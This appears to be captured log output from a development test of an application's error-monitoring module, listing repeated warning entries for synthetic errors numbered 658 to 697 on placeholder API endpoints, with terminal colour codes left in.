WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719177Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 658'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719238Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 659'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719291Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 660'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719342Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 661'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719392Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 662'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719441Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 663'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719490Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 664'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719540Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 665'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719588Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 666'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719637Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 667'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719686Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 668'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719736Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 669'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719785Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 670'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719864Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 671'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719946Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 672'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720005Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 673'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720057Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 674'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720108Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 675'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720158Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 676'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720208Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 677'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720258Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 678'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720307Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 679'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720355Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 680'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720405Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 681'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720455Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 682'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720510Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 683'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720561Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 684'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720611Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 685'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720661Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 686'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720712Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 687'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720761Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 688'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720811Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 689'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720861Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 690'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720911Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 691'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720959Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 692'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721007Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 693'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721055Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 694'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721104Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 695'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721152Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 696'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.721200Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 697'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
